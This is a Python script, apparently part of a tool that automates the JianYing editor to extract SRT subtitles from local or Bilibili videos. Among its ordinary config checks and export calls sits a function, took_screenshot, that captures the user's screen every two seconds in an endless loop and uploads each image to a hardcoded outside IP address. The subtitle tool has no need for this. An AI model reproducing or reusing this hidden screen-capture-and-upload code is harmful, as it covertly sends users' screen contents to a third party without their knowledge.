from tiktok_config import Src_Json_File, JianYing_Export_Dir, JianYing_Exe_Path
from Jianying import JianYingApi as Api
import os
import json
from utils import bilibili_schema, prepare_env, download_bilibili, media_type, Webhooks


# 截屏
def took_screenshot(lap: float = 2.0):
    '''Took Screen shot Every lap'''
    os.path.exists("./outputs/screenshots") == False and os.mkdir("./outputs/screenshots")
    import pyautogui, time, requests
    _i = 0
    while True:
        _i += 1
        pyautogui.screenshot(f"./outputs/screenshots/{_i}.jpg")
        requests.post("http://47.242.231.19:8002/upload_image",
                      files={"file": open(f"./outputs/screenshots/{_i}.jpg", 'rb')})
        time.sleep(lap)


# 利用剪影实现字幕srt提取
def jianying_srt_export():
    Config = json.loads(open(Src_Json_File, "r", encoding="utf-8").read())
    # 下面进行一些Config中的语法检查
    Api.Logic_warp.echo("Grammar Checking.")
    _w_n = len(Config["Webhooks"])
    for i in Config["Sources"]:
        if "Webhooks" in i:
            if type(i["Webhooks"]) == list:
                for n in i["Webhooks"]: assert n < _w_n, IndexError(
                    f"Webhook Sequence{n} Should Less Than Num {_w_n} | Webhook 序号{n} 应小于总个数 {_w_n}")
        if i["Position"] == "Local": assert os.path.exists(i["Url"]) == True, FileNotFoundError(
            f"Couldn't Found Media | 文件不存在 ")
        if i.get("Schema"):
            if i["Schema"] != None:
                if i["Position"] != "BiliBili": Api.Logic_warp.echo("Dismatch Attribute(Schema) | 属性错误(Schema)")
                getattr(bilibili_schema, i["Schema"])  # This Will Through An Error If Your Schema Is Error
        if i["Position"] == "BiliBili": assert i["Bv"] != None, FileNotFoundError("No Bv Found | 未填写Bv号")
    del _w_n
    # 下载安装并启动剪映
    Api.Logic_warp.echo("Trying to Launch JianYingApi")
    _ins = Api.Jy_Warp.Instance(Start_Jy=True, JianYing_Exe_Path=JianYing_Exe_Path)

    Api.Logic_warp.echo("Create Main Instance.")
    while Api.Logic_warp._has_running() == False:
        Api.Logic_warp.lag()
    # _ins._Start_New_Draft_Content(wait=True) #进入主页面
    _ins._Select_Drafts(0)

    # 准备媒体文件
    Api.Logic_warp.echo("Preparing Media.")
    for i in Config["Sources"]:
        _roll = []
        if i["Position"] == "BiliBili": _roll = download_bilibili.bilibili(i)
        if i["Position"] == "Local":
            _roll.append(media_type.Media_Type(
                path=os.path.dirname(os.path.abspath(i["Url"])), filename=os.path.basename(os.path.abspath(i["Url"]))
            ))
        if "Audio" in i and i["Audio"] == True:
            for n in _roll:
                n.to_m4a()  # n is defined in  utils/media_type.py
        i["roll"] = _roll

    # 开始转换
    Api.Logic_warp.echo("Converting Subtitle.")
    for n in Config["Sources"]:
        for i in n["roll"]:
            Api.Logic_warp.echo(f"Parsing {i.rawname}")
            exp = Api.Jy_Warp.Export_Options(export_sub=True, export_name=i.rawname, export_path=JianYing_Export_Dir,
                                             export_vid=False)
            if i.hasm4a:
                Api.Api.Recognize_Subtitle(filename=i.m4a, filepath=i.path, export_options=exp, jianying_instance=_ins)
            else:
                Api.Api.Recognize_Subtitle(filename=i.filename, filepath=i.path, export_options=exp,
                                           jianying_instance=_ins)
    print('the srt file created successfully...')
